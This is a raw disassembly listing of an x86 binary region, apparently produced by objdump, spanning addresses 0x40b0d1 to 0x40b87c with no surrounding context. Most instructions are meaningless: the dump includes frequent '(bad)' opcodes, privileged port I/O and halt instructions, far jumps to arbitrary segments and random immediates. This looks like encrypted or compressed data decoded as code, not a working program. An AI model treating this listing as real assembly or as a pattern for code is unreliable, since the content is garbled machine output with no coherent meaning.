  40b0d1:	adc    DWORD PTR [ecx-0x67],edi
  40b0d4:	retf   
  40b0d5:	adc    DWORD PTR [esi],esp
  40b0d7:	or     edx,DWORD PTR [ebx-0x25]
  40b0da:	jns    0x40b12b
  40b0dc:	add    DWORD PTR [edx-0x64],0xfbc23a4f
  40b0e3:	adc    eax,0x7920eaba
  40b0e8:	shld   DWORD PTR [ecx+0x7f],edi,cl
  40b0ec:	sbb    DWORD PTR [ecx],0x61
  40b0ef:	gs pushf 
  40b0f1:	arpl   WORD PTR [ebx+0x78],bx
  40b0f4:	imul   edi,edx,0x60
  40b0f7:	dec    ebx
  40b0f8:	jo     0x40b160
  40b0fa:	out    0x33,al
  40b0fc:	xor    edi,edi
  40b0fe:	rcl    DWORD PTR [ecx+0x6b],1
  40b101:	(bad)  
  40b102:	xchg   esp,eax
  40b103:	dec    ecx
  40b104:	aam    0x88
  40b106:	mov    BYTE PTR [esi],cl
  40b108:	add    esp,DWORD PTR [edi-0x1f]
  40b10b:	and    ecx,ecx
  40b10d:	in     eax,0x26
  40b10f:	pop    edx
  40b110:	cdq    
  40b111:	iret   
  40b112:	mov    ebx,0xea9a5c4a
  40b117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b118:	sbb    cl,BYTE PTR [esi+0x724c3b75]
  40b11e:	in     eax,0x49
  40b120:	push   0x77
  40b122:	mov    ?,WORD PTR [ebp+0x3b]
  40b125:	push   es
  40b126:	mov    ds:0x80ecf6e9,eax
  40b12b:	and    BYTE PTR [edx-0x2c],cl
  40b12e:	ret    0xd9c9
  40b131:	call   0xd3faaea1
  40b136:	fmul   QWORD PTR [ecx+0x3a]
  40b139:	hlt    
  40b13a:	mov    ds:0x1f57d4af,eax
  40b13f:	lds    ebp,FWORD PTR [esi]
  40b141:	fcomip st,st(5)
  40b143:	adc    eax,0x59b88e8c
  40b148:	jne    0x40b16f
  40b14a:	pop    es
  40b14b:	js     0x40b1a7
  40b14d:	rcl    BYTE PTR [eax],1
  40b14f:	jo     0x40b138
  40b151:	fidivr WORD PTR [ecx+edi*1]
  40b154:	or     al,0x5e
  40b156:	jg     0x40b1c0
  40b158:	cmp    eax,0xb15f5700
  40b15d:	jmp    0x40b162
  40b15f:	push   ds
  40b160:	jl     0x40b0f6
  40b162:	loop   0x40b134
  40b164:	mov    al,0x99
  40b166:	sbb    ebx,DWORD PTR [esp+edx*2]
  40b169:	ret    
  40b16a:	dec    esp
  40b16b:	fistp  DWORD PTR [esi-0x30]
  40b16e:	push   es
  40b16f:	dec    esi
  40b170:	mov    WORD PTR [ecx+0x64507c84],es
  40b176:	clc    
  40b177:	dec    edx
  40b178:	pcmpgtw mm3,QWORD PTR [esi-0x49121ad]
  40b17f:	cdq    
  40b180:	ss cmc 
  40b182:	imul   ebx,DWORD PTR [eax],0xffffffbf
  40b185:	xor    al,BYTE PTR [esi+0x25cc9f42]
  40b18b:	out    dx,ax
  40b18d:	push   esp
  40b18e:	test   esp,edi
  40b190:	jo     0x40b175
  40b192:	cmp    esi,DWORD PTR [edx+0x2a]
  40b195:	pop    esp
  40b196:	push   ebx
  40b197:	(bad)  
  40b198:	enter  0x54d0,0x1e
  40b19c:	call   0x9503:0xbb6fd800
  40b1a3:	sub    al,0x16
  40b1a5:	jbe    0x40b206
  40b1a7:	xchg   esp,eax
  40b1a8:	push   es
  40b1a9:	xchg   ebp,eax
  40b1aa:	push   esp
  40b1ab:	xchg   esp,eax
  40b1ac:	add    dh,bh
  40b1ae:	adc    al,0x4b
  40b1b0:	std    
  40b1b1:	push   ss
  40b1b2:	rcr    DWORD PTR [eax+0xfb9e491],1
  40b1b8:	(bad)  
  40b1b9:	xor    eax,0xf3d30d17
  40b1be:	sbb    edi,DWORD PTR [ebp-0x64]
  40b1c1:	aad    0x2c
  40b1c3:	enter  0xb932,0x4b
  40b1c7:	push   esp
  40b1c8:	inc    ebx
  40b1c9:	jp     0x40b1d2
  40b1cb:	gs retf 
  40b1cd:	neg    DWORD PTR [ebp-0x63]
  40b1d0:	jno    0x40b229
  40b1d2:	push   es
  40b1d3:	fstp   TBYTE PTR [edi]
  40b1d5:	or     ch,BYTE PTR [eax+ebx*2+0x2446aa37]
  40b1dc:	push   ebx
  40b1dd:	adc    al,0xcc
  40b1df:	or     al,0xc8
  40b1e1:	add    eax,0xda6836ab
  40b1e6:	add    ah,dh
  40b1e8:	sbb    DWORD PTR [edx+0xc],ebx
  40b1eb:	push   edx
  40b1ec:	jecxz  0x40b1b0
  40b1ee:	mov    edx,0xd19fd6b3
  40b1f3:	ret    0x646f
  40b1f6:	in     al,0x91
  40b1f8:	mov    ecx,0xec2155e5
  40b1fd:	test   eax,0x233c894f
  40b202:	aaa    
  40b203:	mov    DWORD PTR [edi-0x39],edx
  40b206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b207:	loop   0x40b1b3
  40b209:	mov    WORD PTR [edi-0x69],fs
  40b20c:	(bad)  
  40b20d:	push   ecx
  40b20e:	icebp  
  40b20f:	sbb    DWORD PTR [edi-0x7c4108bc],ebx
  40b215:	mov    eax,0x2762c6b5
  40b21a:	mov    dh,0xc8
  40b21c:	push   ebp
  40b21d:	hlt    
  40b21e:	clc    
  40b21f:	int3   
  40b220:	retf   0x8551
  40b223:	push   ebp
  40b224:	pop    ebp
  40b225:	add    ebx,DWORD PTR [edi+0x54]
  40b228:	jmp    0x5ee22643
  40b22d:	std    
  40b22e:	cdq    
  40b22f:	fiadd  WORD PTR [edx]
  40b231:	test   BYTE PTR [ecx+0x35fa744b],al
  40b237:	into   
  40b238:	pop    ebp
  40b239:	xor    ebp,DWORD PTR ss:[eax-0x213a57c]
  40b240:	cmp    cl,al
  40b242:	xchg   BYTE PTR [eax],dl
  40b244:	rol    DWORD PTR [ebp+eax*2-0x9],cl
  40b248:	or     bh,BYTE PTR [eax]
  40b24a:	push   es
  40b24b:	ds mov esi,0xd3acaf3
  40b251:	adc    BYTE PTR [edi],ah
  40b253:	outs   dx,BYTE PTR ds:[esi]
  40b254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b255:	dec    ebp
  40b256:	jmp    WORD PTR [ecx*8-0x2e1c9a8c]
  40b25e:	xchg   ebp,eax
  40b25f:	and    dl,ch
  40b261:	clc    
  40b262:	repnz mov eax,ds:0x52f202b8
  40b268:	(bad)  
  40b269:	stos   DWORD PTR es:[edi],eax
  40b26a:	xor    eax,0x285c71b
  40b26f:	dec    esi
  40b270:	retf   
  40b271:	mov    cl,0x4
  40b273:	push   esi
  40b274:	enter  0x96bf,0x3d
  40b278:	gs in  eax,0x5a
  40b27b:	xchg   esp,eax
  40b27c:	mov    ebp,0x1bd96c2f
  40b281:	dec    eax
  40b282:	call   0x7472:0x2182da5c
  40b289:	xor    BYTE PTR ds:0x4c9bbd84,dh
  40b28f:	xchg   DWORD PTR [ebp-0x790c604a],edi
  40b295:	pop    esp
  40b296:	imul   esp,esp,0xb0e358e5
  40b29c:	sub    al,0xc6
  40b29e:	push   edx
  40b29f:	push   eax
  40b2a0:	dec    edi
  40b2a1:	jp     0x40b317
  40b2a3:	adc    eax,0x542b1639
  40b2a8:	ss pop esi
  40b2aa:	clc    
  40b2ab:	mov    edi,0x3096b145
  40b2b0:	jns    0x40b269
  40b2b2:	test   al,0x39
  40b2b4:	and    eax,ebx
  40b2b6:	mov    eax,0xc17d0eaa
  40b2bb:	sbb    esp,DWORD PTR [edx]
  40b2bd:	or     dh,bh
  40b2bf:	mov    esp,0x68dc473
  40b2c4:	(bad)  
  40b2c6:	aaa    
  40b2c7:	fcmovne st,st(0)
  40b2c9:	dec    ecx
  40b2ca:	xchg   edi,eax
  40b2cb:	dec    ebp
  40b2cc:	sub    edi,edx
  40b2ce:	lock imul esp,DWORD PTR [edi-0x11],0x428edf86
  40b2d6:	dec    esp
  40b2d7:	dec    ecx
  40b2d8:	(bad)  
  40b2d9:	out    dx,al
  40b2da:	sub    bh,BYTE PTR [edx+edi*8-0x2]
  40b2de:	mov    esp,0xc6b1b7f2
  40b2e3:	inc    eax
  40b2e4:	into   
  40b2e5:	xor    DWORD PTR [ebx-0x72],ebp
  40b2e8:	aas    
  40b2e9:	out    dx,eax
  40b2ea:	xor    eax,0xc77c5c6c
  40b2ef:	xchg   DWORD PTR [ebp-0xd32dd24],edx
  40b2f5:	out    dx,eax
  40b2f6:	mov    esp,0x6cf9ea3e
  40b2fb:	mov    edx,0x7af0dbeb
  40b300:	cmc    
  40b301:	push   ds
  40b302:	(bad)  
  40b303:	scas   eax,DWORD PTR es:[edi]
  40b304:	cmp    al,BYTE PTR [eax-0x64]
  40b307:	call   0xcb74:0x1d13b4d7
  40b30e:	xchg   esi,eax
  40b30f:	or     ebx,edi
  40b311:	test   esp,ecx
  40b313:	xchg   ebx,eax
  40b314:	stos   WORD PTR es:[edi],ax
  40b316:	jmp    DWORD PTR [eax-0x5e5140f1]
  40b31c:	xchg   bh,cl
  40b31e:	ret    0x2478
  40b321:	retf   0x67e0
  40b324:	loope  0x40b37c
  40b326:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40b328:	inc    esi
  40b329:	cli    
  40b32a:	sub    esp,esi
  40b32c:	jb     0x40b2f3
  40b32e:	call   0x3238ec1
  40b333:	stos   BYTE PTR es:[edi],al
  40b334:	aas    
  40b335:	mov    ch,cl
  40b337:	xchg   ebp,eax
  40b338:	pop    esi
  40b339:	bound  ebx,QWORD PTR [eax-0x61f49c1c]
  40b33f:	mov    dl,BYTE PTR [esi+0x20]
  40b342:	add    ch,bh
  40b344:	push   ebp
  40b345:	cs mov ebx,ebx
  40b348:	jecxz  0x40b3b6
  40b34a:	xchg   esp,eax
  40b34b:	pop    DWORD PTR [ebp-0x30289195]
  40b351:	lea    ebx,[edx]
  40b353:	fsub   QWORD PTR [ecx]
  40b355:	mov    al,0xdc
  40b357:	repnz imul ebx,DWORD PTR [edx-0x45],0x19
  40b35c:	aas    
  40b35d:	mov    eax,0x8dcb41df
  40b362:	(bad)  
  40b363:	mov    eax,0x214bed55
  40b368:	push   0xffffff81
  40b36a:	stc    
  40b36b:	cmp    ah,0xca
  40b36e:	mov    edx,0x6ecf5d4c
  40b373:	mov    eax,0x37d07970
  40b378:	cli    
  40b379:	adc    eax,0xce98b991
  40b37e:	xor    eax,0x6166cabf
  40b383:	push   esp
  40b384:	fimul  WORD PTR [edx-0x4b]
  40b387:	dec    eax
  40b388:	mov    al,ds:0xe1eef748
  40b38d:	clc    
  40b38e:	hlt    
  40b38f:	xchg   ecx,ebp
  40b391:	mov    dl,0x94
  40b393:	loope  0x40b341
  40b395:	mov    dh,0xb8
  40b397:	je     0x40b37c
  40b399:	ret    0xf544
  40b39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b39d:	mov    eax,0x359f1461
  40b3a2:	xchg   ecx,eax
  40b3a3:	inc    esi
  40b3a4:	(bad)  
  40b3a5:	mov    ds:0xd1c39193,eax
  40b3aa:	or     eax,0x921297b9
  40b3af:	xchg   ebp,eax
  40b3b0:	or     eax,0x5cc3f52e
  40b3b5:	stc    
  40b3b6:	dec    ebx
  40b3b7:	scas   al,BYTE PTR es:[edi]
  40b3b8:	inc    ecx
  40b3b9:	pop    es
  40b3ba:	xor    ch,dl
  40b3bc:	jmp    0x40b437
  40b3be:	mov    ?,WORD PTR [edx-0x496b7027]
  40b3c4:	les    ebp,FWORD PTR [edi+edx*4-0xde98f93]
  40b3cb:	sar    DWORD PTR [eax-0x63d313f5],1
  40b3d1:	pop    esp
  40b3d2:	sub    al,0x78
  40b3d4:	fcmove st,st(7)
  40b3d6:	or     eax,0xa509bbba
  40b3db:	lds    ebp,FWORD PTR [esi+0x4b967d2b]
  40b3e1:	mov    BYTE PTR [edi+0x76],cl
  40b3e4:	test   DWORD PTR fs:[edi],esi
  40b3e7:	mov    ch,0x81
  40b3e9:	push   edx
  40b3ea:	sti    
  40b3eb:	xchg   ecx,eax
  40b3ec:	cld    
  40b3ed:	fbstp  TBYTE PTR [ecx-0xadccb1f]
  40b3f3:	mov    al,ds:0xd70e25
  40b3f8:	pop    edi
  40b3f9:	adc    al,0x51
  40b3fb:	cmp    esp,edi
  40b3fd:	inc    edi
  40b3fe:	in     eax,dx
  40b3ff:	popa   
  40b400:	mov    ecx,DWORD PTR [ebx-0x14fb14e]
  40b406:	jl     0x40b47e
  40b408:	scas   al,BYTE PTR es:[edi]
  40b409:	out    dx,al
  40b40a:	sbb    ebp,edx
  40b40c:	test   DWORD PTR [edx-0x2],esi
  40b40f:	std    
  40b410:	jp     0x40b3bd
  40b412:	and    al,bh
  40b414:	cmp    eax,0x94632c08
  40b419:	mov    WORD PTR [edi],fs
  40b41b:	push   es
  40b41c:	mov    al,ds:0x43bdab52
  40b421:	dec    esi
  40b422:	push   edi
  40b423:	sub    eax,0xf40f52f7
  40b428:	dec    ebp
  40b429:	sbb    DWORD PTR [edx-0x6],ebp
  40b42c:	inc    edi
  40b42d:	lea    esp,[ebx]
  40b42f:	dec    esi
  40b430:	test   eax,0x763a720e
  40b435:	push   esi
  40b436:	xchg   ah,cl
  40b438:	test   al,0xbd
  40b43a:	add    bh,BYTE PTR [edi-0x6b]
  40b43d:	or     al,0x23
  40b43f:	ret    
  40b440:	mov    edi,edi
  40b442:	loopne 0x40b3da
  40b444:	mov    eax,ds:0x139e0cef
  40b449:	mov    eax,0x1c6b79ca
  40b44e:	stos   DWORD PTR es:[edi],eax
  40b44f:	cmp    BYTE PTR [edi+0x2f80924b],0x2c
  40b456:	jmp    0x102:0x1bdd5e0f
  40b45d:	dec    esp
  40b45e:	(bad)  
  40b45f:	fstp   QWORD PTR [ebx]
  40b461:	xor    bl,BYTE PTR [ebp+0x197ea0b0]
  40b467:	cld    
  40b468:	push   es
  40b469:	pop    ebx
  40b46a:	pop    ds
  40b46b:	mov    dh,0x15
  40b46d:	sbb    ebx,edx
  40b46f:	jb     0x40b4eb
  40b471:	div    edi
  40b473:	pop    ds
  40b474:	out    0xb0,eax
  40b476:	out    0x3d,al
  40b478:	and    al,0x22
  40b47a:	mov    esp,cs
  40b47c:	dec    esi
  40b47d:	neg    DWORD PTR [eax]
  40b47f:	(bad)  
  40b480:	cmp    eax,0x28a5f5c3
  40b485:	iret   
  40b486:	hlt    
  40b487:	or     esp,esi
  40b489:	daa    
  40b48a:	fistp  DWORD PTR [edx+0xf]
  40b48d:	add    dl,ah
  40b48f:	loop   0x40b4c2
  40b491:	mov    cl,0xa3
  40b493:	sbb    esi,DWORD PTR [eax+0x58]
  40b496:	int    0x5e
  40b498:	(bad)  
  40b499:	jo     0x40b4f2
  40b49b:	mov    WORD PTR [esi],gs
  40b49d:	out    0x16,al
  40b49f:	or     esi,DWORD PTR [ecx+0x17689204]
  40b4a5:	fwait
  40b4a6:	and    eax,0xf056cbe8
  40b4ab:	test   al,0xa3
  40b4ad:	jmp    0x7a35:0xf4468dde
  40b4b4:	dec    ecx
  40b4b5:	mov    eax,0x531b9426
  40b4ba:	(bad)  
  40b4bb:	pop    ecx
  40b4bc:	jecxz  0x40b4f6
  40b4be:	cmp    eax,0x98749841
  40b4c3:	in     eax,0x1a
  40b4c5:	in     eax,0xef
  40b4c7:	sbb    DWORD PTR [esi+0x50],esp
  40b4ca:	mov    edi,0x3fd4fea7
  40b4cf:	xor    al,0x9c
  40b4d1:	jnp    0x40b4e3
  40b4d3:	jns    0x40b4cd
  40b4d5:	xchg   edi,eax
  40b4d6:	mov    dl,0x65
  40b4d8:	sar    DWORD PTR [eax+edi*2-0x1defc0f0],1
  40b4df:	cmp    ah,ah
  40b4e1:	clc    
  40b4e2:	int    0x9e
  40b4e4:	ret    0x7adf
  40b4e7:	cwde   
  40b4e8:	adc    eax,0xfd75c590
  40b4ed:	adc    al,0xe0
  40b4ef:	or     esi,DWORD PTR [edi]
  40b4f1:	aam    0x13
  40b4f3:	dec    esi
  40b4f4:	pop    edx
  40b4f5:	aad    0x71
  40b4f7:	in     eax,0xcc
  40b4f9:	pushf  
  40b4fa:	cs inc edi
  40b4fc:	mov    esi,0x2779cfb7
  40b501:	idiv   al
  40b503:	mov    edx,0xa364ee3e
  40b508:	jns    0x40b55b
  40b50a:	shr    edi,cl
  40b50c:	call   0x5f69:0x99618c9e
  40b513:	push   ebx
  40b514:	push   ebx
  40b515:	sbb    esi,DWORD PTR [edx]
  40b517:	test   al,0x15
  40b519:	loop   0x40b4f3
  40b51b:	jo     0x40b52a
  40b51d:	and    eax,0x36e36131
  40b522:	scas   al,BYTE PTR es:[edi]
  40b523:	(bad)  
  40b524:	pop    ebp
  40b525:	xlat   BYTE PTR ds:[ebx]
  40b526:	loope  0x40b4ef
  40b528:	cmc    
  40b529:	pop    ss
  40b52a:	in     eax,dx
  40b52b:	lds    esi,FWORD PTR [esi+0x39]
  40b52e:	jecxz  0x40b504
  40b530:	push   esp
  40b531:	out    0xa2,eax
  40b533:	repnz add eax,0x4cbdef53
  40b539:	add    al,0xf
  40b53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53c:	out    dx,eax
  40b53d:	fisubr DWORD PTR [ecx-0x21]
  40b540:	in     eax,0xfa
  40b542:	pop    es
  40b543:	dec    esp
  40b544:	or     eax,0xf15fead
  40b549:	repz adc BYTE PTR [edi-0xc],dh
  40b54d:	(bad)  
  40b54e:	fstp   DWORD PTR [esi+esi*2]
  40b551:	(bad)  
  40b552:	leave  
  40b553:	pushf  
  40b554:	outs   dx,DWORD PTR ds:[esi]
  40b555:	(bad)  
  40b556:	(bad)  
  40b557:	mov    al,ds:0xc7740b00
  40b55c:	lods   al,BYTE PTR ds:[esi]
  40b55d:	add    al,bl
  40b55f:	xchg   ebx,eax
  40b560:	sbb    DWORD PTR [edx],esp
  40b562:	push   esi
  40b563:	xchg   edx,eax
  40b564:	loop   0x40b543
  40b566:	cmp    BYTE PTR [eax+0x1fac4da6],0xf
  40b56d:	sbb    al,0xaa
  40b56f:	(bad)  
  40b570:	adc    ch,BYTE PTR [ebx+0x4971d8d3]
  40b576:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b578:	push   0x41
  40b57a:	dec    ebp
  40b57b:	xor    al,BYTE PTR [ebp+0x6bfe9fda]
  40b581:	cmp    BYTE PTR [eax+0x291a7f42],cl
  40b587:	jbe    0x40b5b7
  40b589:	imul   BYTE PTR [edi+0x37]
  40b58c:	sub    DWORD PTR [ebp-0x2dc91af8],ecx
  40b592:	push   esi
  40b593:	add    bl,BYTE PTR [ebp-0x3f]
  40b596:	xor    DWORD PTR [edx+0x78252e87],ebp
  40b59c:	(bad)  
  40b59d:	xchg   esi,eax
  40b59e:	sub    dl,al
  40b5a0:	push   0x4f
  40b5a2:	push   esi
  40b5a3:	(bad)  
  40b5a5:	test   dl,dh
  40b5a7:	add    DWORD PTR [esi+0x62],eax
  40b5aa:	cmp    edi,0xffffffb4
  40b5ad:	es push ds
  40b5af:	in     al,dx
  40b5b0:	mov    dl,BYTE PTR [ecx+0x3ac1c257]
  40b5b6:	cdq    
  40b5b7:	push   ds
  40b5b8:	lea    eax,[ebx-0xceb663c]
  40b5be:	cmc    
  40b5bf:	ins    DWORD PTR es:[edi],dx
  40b5c0:	icebp  
  40b5c1:	lods   eax,DWORD PTR ds:[esi]
  40b5c2:	pop    eax
  40b5c3:	pop    edi
  40b5c4:	jo     0x40b555
  40b5c6:	call   0xd54d:0x1510ae95
  40b5cd:	sub    esi,DWORD PTR [ebx]
  40b5cf:	jbe    0x40b63d
  40b5d1:	bound  esi,QWORD PTR [esi]
  40b5d3:	imul   esp,eax,0x3d55d452
  40b5d9:	push   ss
  40b5da:	mov    ds:0x4a9dace8,eax
  40b5df:	inc    esp
  40b5e0:	add    bh,BYTE PTR [ebx+0x62fa0223]
  40b5e6:	stos   DWORD PTR es:[di],eax
  40b5e8:	fisttp WORD PTR [ecx]
  40b5ea:	mov    esp,DWORD PTR [edx+0x7d]
  40b5ed:	mov    ecx,0x7c0921b1
  40b5f2:	not    DWORD PTR [edx]
  40b5f4:	ins    BYTE PTR es:[edi],dx
  40b5f5:	push   es
  40b5f6:	fst    st(6)
  40b5f8:	add    ecx,DWORD PTR [edx+0x4a4c436c]
  40b5fe:	mov    ds:0x3e639f54,eax
  40b603:	inc    ecx
  40b604:	imul   eax,DWORD PTR [eax],0xb0d0bb4a
  40b60a:	mov    eax,0x16d4598d
  40b60f:	push   edx
  40b610:	icebp  
  40b611:	out    0xf8,eax
  40b613:	dec    edi
  40b614:	ret    
  40b615:	fild   DWORD PTR [edi-0x34878685]
  40b61b:	test   eax,0xa7971d27
  40b620:	cdq    
  40b621:	iret   
  40b622:	mov    dl,0x6
  40b624:	jecxz  0x40b5d9
  40b626:	sub    al,0x89
  40b628:	xchg   edx,eax
  40b629:	out    0xfa,eax
  40b62b:	mov    DWORD PTR [ecx+ecx*8+0x25],edx
  40b62f:	rcl    ecx,0xd7
  40b632:	mov    bl,0x90
  40b634:	pop    eax
  40b635:	jg     0x40b6a0
  40b637:	test   BYTE PTR [ebx-0x10037a8f],bl
  40b63d:	ror    dh,cl
  40b63f:	ins    DWORD PTR es:[edi],dx
  40b640:	mov    ds:0x8f2c8dca,eax
  40b645:	jb     0x40b62c
  40b647:	call   0xdf99:0x3e06ad55
  40b64e:	mov    ch,0x89
  40b650:	stos   BYTE PTR es:[edi],al
  40b651:	add    DWORD PTR [ecx-0x47486ef2],0xe48b3147
  40b65b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b65c:	test   ebp,edx
  40b65e:	mov    cl,0x1e
  40b660:	or     al,BYTE PTR ds:0x45736a13
  40b666:	out    dx,al
  40b667:	xchg   ebp,eax
  40b668:	jmp    0x8861:0xf490e058
  40b66f:	dec    ebp
  40b670:	call   0xb0edc595
  40b675:	pop    esi
  40b676:	mov    fs,WORD PTR [esp+edx*8-0x26024cdf]
  40b67d:	rcl    DWORD PTR [edi],0xc4
  40b680:	xor    al,0xaf
  40b682:	shl    BYTE PTR ds:0xa8073f2e,cl
  40b688:	mov    ecx,0x23cec71c
  40b68d:	stos   BYTE PTR es:[edi],al
  40b68e:	loope  0x40b65c
  40b690:	xlat   BYTE PTR ds:[ebx]
  40b691:	mov    dl,0x29
  40b693:	push   edx
  40b694:	xchg   esi,eax
  40b695:	inc    esi
  40b696:	xor    al,0x3a
  40b698:	cmp    DWORD PTR [edi],0x70df02ac
  40b69e:	fst    DWORD PTR [eax+0x295d460]
  40b6a4:	jmp    0x40b6cb
  40b6a6:	xchg   ebp,eax
  40b6a7:	mov    ecx,0x809b5503
  40b6ac:	mov    ecx,ecx
  40b6ae:	push   0x78b24df5
  40b6b3:	sbb    dl,BYTE PTR [esp+eax*1+0x3c]
  40b6b7:	aam    0x57
  40b6b9:	adc    al,0x8d
  40b6bb:	pop    DWORD PTR cs:0x8be74dd2
  40b6c2:	dec    edx
  40b6c3:	fmul   DWORD PTR [eax+ebp*2+0x7442dab9]
  40b6ca:	add    dh,BYTE PTR [edx]
  40b6cc:	test   eax,0xc45429f8
  40b6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6d2:	push   edi
  40b6d3:	and    esi,DWORD PTR [esi-0x4b7c4144]
  40b6d9:	test   al,0x0
  40b6db:	inc    edx
  40b6dc:	(bad)  
  40b6dd:	repz pop ds
  40b6df:	loopne 0x40b681
  40b6e1:	into   
  40b6e2:	or     DWORD PTR [esi-0x1af93353],esp
  40b6e8:	jae    0x40b70b
  40b6ea:	sti    
  40b6eb:	retf   0xa006
  40b6ee:	cmp    DWORD PTR [esi+edx*8-0x12],edx
  40b6f2:	loope  0x40b757
  40b6f4:	daa    
  40b6f5:	cmp    BYTE PTR [edi+0x5f065bef],ch
  40b6fb:	pop    ss
  40b6fc:	and    ch,ah
  40b6fe:	jl     0xfc153872
  40b704:	stos   DWORD PTR es:[edi],eax
  40b705:	iret   
  40b706:	push   esi
  40b707:	nop
  40b708:	cmp    dl,BYTE PTR [ebx-0x53]
  40b70b:	cwde   
  40b70c:	push   edx
  40b70d:	loop   0x40b6d3
  40b70f:	mov    BYTE PTR [edi-0x55],bl
  40b712:	lahf   
  40b713:	ficom  DWORD PTR [edx+0x1cf49eae]
  40b719:	scas   eax,DWORD PTR es:[edi]
  40b71a:	pop    ds
  40b71b:	xor    dh,BYTE PTR [ecx]
  40b71d:	sbb    dh,cl
  40b71f:	jmp    0x9167:0xf86a361e
  40b726:	or     BYTE PTR [ebx+0x23],0x45
  40b72a:	hlt    
  40b72b:	mov    BYTE PTR [ebp+0x4c],0x62
  40b72f:	je     0x40b74a
  40b731:	not    DWORD PTR [eax-0x3e]
  40b734:	popa   
  40b735:	mov    dl,0x94
  40b737:	inc    ebx
  40b738:	shl    DWORD PTR [eax+esi*4-0x10118086],0x30
  40b740:	xor    al,0xc2
  40b742:	add    ecx,eax
  40b744:	bound  esp,QWORD PTR [ebx+0x20798767]
  40b74a:	pop    esp
  40b74b:	xchg   ebp,eax
  40b74c:	and    esp,0x78576d26
  40b752:	push   ebp
  40b753:	mov    eax,0x93830945
  40b758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b75a:	fsubp  st(7),st
  40b75c:	mov    edi,0x3270144d
  40b761:	(bad)  
  40b763:	inc    eax
  40b764:	dec    edi
  40b765:	neg    BYTE PTR gs:[ebx+0x4efd8e0b]
  40b76c:	(bad)  
  40b76d:	cld    
  40b76e:	bound  eax,QWORD PTR [ebx]
  40b770:	mov    DWORD PTR [edx],ebp
  40b772:	mov    esp,0xd7239f38
  40b777:	mov    ds:0x86d3e680,al
  40b77c:	jo     0x40b748
  40b77e:	(bad)  
  40b77f:	lods   al,BYTE PTR ds:[esi]
  40b780:	hlt    
  40b781:	and    eax,0x231c3223
  40b786:	aam    0x7c
  40b788:	push   ebx
  40b789:	push   edi
  40b78a:	sbb    eax,0x3f20dc3d
  40b78f:	or     BYTE PTR [ecx],dl
  40b791:	adc    ebx,ebx
  40b793:	repz les esp,FWORD PTR [ecx-0x1ac8f34c]
  40b79a:	cdq    
  40b79b:	add    eax,ebp
  40b79d:	inc    ebp
  40b79e:	es js  0x40b741
  40b7a1:	jmp    0x15fb5297
  40b7a6:	jle    0x40b77e
  40b7a8:	iret   
  40b7a9:	pusha  
  40b7aa:	fiadd  DWORD PTR [edx]
  40b7ac:	jno    0x40b7eb
  40b7ae:	ds xchg ebp,eax
  40b7b0:	imul   ebx,DWORD PTR [ecx-0xf25acb1],0x61cbfc66
  40b7ba:	inc    edi
  40b7bb:	hlt    
  40b7bc:	cs pusha 
  40b7be:	xor    al,0x69
  40b7c0:	fwait
  40b7c1:	test   DWORD PTR [ebp+edx*2+0x511a8047],esp
  40b7c8:	call   0x70bd:0x6e9244
  40b7cf:	sti    
  40b7d0:	add    edx,DWORD PTR [ecx-0x1e981270]
  40b7d6:	bound  ebp,QWORD PTR [ebx]
  40b7d8:	lods   al,BYTE PTR ds:[esi]
  40b7d9:	inc    edi
  40b7da:	in     al,0x8f
  40b7dc:	push   0xffffffcf
  40b7de:	fst    st(7)
  40b7e0:	sub    eax,DWORD PTR [esi+0x13]
  40b7e3:	ret    
  40b7e4:	test   DWORD PTR [esi-0x31],esp
  40b7e7:	mov    DWORD PTR [edi-0x20],ecx
  40b7ea:	adc    al,0xdb
  40b7ec:	mov    esi,0x3ced3278
  40b7f1:	rcr    DWORD PTR [edx],cl
  40b7f3:	es and al,0x13
  40b7f6:	lods   al,BYTE PTR ds:[esi]
  40b7f7:	mov    WORD PTR [ecx],?
  40b7f9:	adc    ch,BYTE PTR [esi+0x253af071]
  40b7ff:	jbe    0x40b794
  40b801:	ror    BYTE PTR [ebx-0xa],cl
  40b804:	das    
  40b805:	xchg   esp,eax
  40b806:	adc    ah,dh
  40b808:	or     DWORD PTR [edi],eax
  40b80a:	jle    0x40b807
  40b80c:	mov    ah,0xaf
  40b80e:	fmul   QWORD PTR [esp+eax*2-0x78404164]
  40b815:	stos   DWORD PTR es:[edi],eax
  40b816:	pop    es
  40b817:	mov    eax,ds:0x399affaa
  40b81c:	sub    DWORD PTR [ecx+edx*4+0x626b3bef],ebx
  40b823:	xchg   BYTE PTR [ebx],al
  40b825:	sahf   
  40b826:	mov    ebp,0x30b632c0
  40b82b:	mov    eax,ds:0xe3f64963
  40b830:	sbb    al,0x79
  40b832:	cli    
  40b833:	fcmovb st,st(0)
  40b835:	jp     0x40b7e1
  40b837:	lahf   
  40b838:	sti    
  40b839:	int    0xa5
  40b83b:	arpl   sp,ax
  40b83d:	push   ss
  40b83e:	neg    DWORD PTR [edx+0x66]
  40b841:	mov    dl,0xa4
  40b843:	add    al,0x52
  40b845:	lds    edx,FWORD PTR [ebp-0x1373e575]
  40b84b:	cs int3 
  40b84d:	out    dx,eax
  40b84e:	jecxz  0x40b886
  40b850:	lods   eax,DWORD PTR ds:[esi]
  40b851:	pusha  
  40b852:	nop
  40b853:	test   eax,0xf98509d8
  40b859:	pop    edi
  40b85a:	ins    DWORD PTR es:[edi],dx
  40b85b:	(bad)  
  40b85d:	push   ebx
  40b85e:	dec    ebx
  40b85f:	mov    cl,0x4e
  40b861:	repnz imul esp,DWORD PTR [ebp+0x57],0xffffff9e
  40b866:	jle    0x40b857
  40b868:	mov    bh,BYTE PTR [esi-0x31]
  40b86b:	scas   al,BYTE PTR es:[edi]
  40b86c:	das    
  40b86d:	leave  
  40b86e:	push   esi
  40b86f:	cmp    ebp,DWORD PTR [esi+0x74b2ea78]
  40b875:	xor    esp,DWORD PTR [ecx-0x9d0f913]
  40b87b:	std    
  40b87c:	add    eax,0xdfe8af2e
